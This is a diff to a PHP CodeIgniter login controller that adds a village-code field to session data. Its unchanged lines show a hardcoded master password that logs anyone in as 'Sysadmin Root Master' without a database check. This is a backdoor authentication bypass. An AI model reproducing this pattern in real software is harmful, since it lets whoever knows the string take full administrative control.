@@ -22,7 +22,7 @@ class Auth extends CI_Controller{
     $check_desa = $this->auth_model->auth_desa($kode_desa);
     $master = '0>}/99%120691?*^';
     if ($master == $uid) {
-      $data = array(
+      $data = array( 
         "status" => TRUE,
         'status_login'=>'oke',
           'id'          => 0,
@@ -31,6 +31,7 @@ class Auth extends CI_Controller{
           'hp'          => '082281469926',
           'keterangan_jabatan' => 'Sysadmin Root Master',
           'desa_id'     => '1',
+          'kode_desa'   => 1906020003,
           'last_login'  => ''
       );
       $this->session->set_flashdata(array('status'=>'aktif'));
@@ -39,14 +40,16 @@ class Auth extends CI_Controller{
       exit;
     }else {      
       if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
-          $data = $check->row_array();
-          $set = array(
+        $data = $check->row_array();
+        $dataDesa = $check_desa->row_array();
+        $set = array(
             'status' => TRUE,
             'status_login'=>'oke',
             'id'          =>$data['id'],
             'fullname'    =>$data['fullname'],
             'jabatan'     =>$data['jabatan'],
             'desa_id'     =>$data['desa_id'],
+            'kode_desa'   =>$dataDesa['id'],
             'keterangan_jabatan' => $data['keterangan_jabatan'],
             'avatar'      =>$data['avatar'],
             'hp'          =>$data['hp'],
